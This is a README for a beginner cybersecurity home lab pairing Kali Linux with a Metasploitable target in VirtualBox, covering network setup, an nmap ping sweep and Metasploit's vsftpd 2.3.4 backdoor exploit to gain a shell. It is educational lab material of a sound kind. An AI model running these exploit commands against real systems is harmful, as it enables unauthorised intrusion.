# 💀 Cybersecurity Home Lab (Kali + Metasploitable)

<p align="center">
  <img src="https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif" width="500"/>
</p>

<p align="center">
  <b>Build. Break. Learn. Repeat.</b> 🚀  
  By **Ranjeet Gujjar** - [Portfolio](https://gujjar23.github.io)
</p>

---

## 🛡️ About This Project

This is a **beginner-friendly cybersecurity home lab** built using VirtualBox.  
It allows you to safely practice:

- 🔍 Network Scanning  
- 💣 Exploitation  
- 🧠 Ethical Hacking Concepts  

---

## ⚡ Tech Stack

<p align="center">

![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-2E2E2E?style=for-the-badge&logo=metasploit&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)

</p>

---

## 🧪 Lab Architecture

```
Kali Linux (Attacker)
        |
   CyberLab Network
        |
Metasploitable (Target)
```

---

## ⚙️ Setup Guide

### 1️⃣ Install VirtualBox
- Download and install VirtualBox

### 2️⃣ Setup Kali Linux

```bash
sudo apt update && sudo apt upgrade -y
```

- RAM: 2–4 GB  
- CPU: 2 cores  
- Disk: 20–100 GB  

### 3️⃣ Setup Metasploitable

- Download and extract  
- Import `.vmdk` into VirtualBox  

### 4️⃣ Network Configuration

#### Kali:
- Adapter 1 → NAT 🌐  
- Adapter 2 → Internal Network (`CyberLab`)  

#### Metasploitable:
- Adapter 1 → Internal Network (`CyberLab`)  

---

## 🔍 Reconnaissance

```bash
nmap -sn 192.168.56.0/24
```

---

## 💣 Exploitation

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
run
```

---

## 🎯 Access Gained

```bash
whoami
```

> 🎉 Congrats! You successfully exploited the target system.

---

## 📸 Screenshots

<p align="center">
  <img src="https://media.giphy.com/media/ZVik7pBtu9dNS/giphy.gif" width="400"/>
</p>

---

## ⚠️ Disclaimer

> 🚫 This lab is for **educational purposes only**  
> ❌ Do NOT attack real systems without permission  

---

## 🚀 Future Upgrades

- 🔓 Password Cracking (Hydra, John)  
- 🌐 Web Hacking (DVWA, SQLi)  
- 🪟 Windows Vulnerable VM  
- 📡 Wi-Fi Hacking Lab  

---

## ⭐ Support

If you found this useful:

👉 Give it a ⭐  
👉 Follow for more cybersecurity projects  

<p align="center">
  <img src="https://media.giphy.com/media/l0HlQ7LRalQqdWfao/giphy.gif" width="300"/>
</p>

<p align="center">
  Portfolio: <a href="https://gujjar23.github.io">gujjar23.github.io</a>  
  By **Ranjeet Gujjar**
</p>
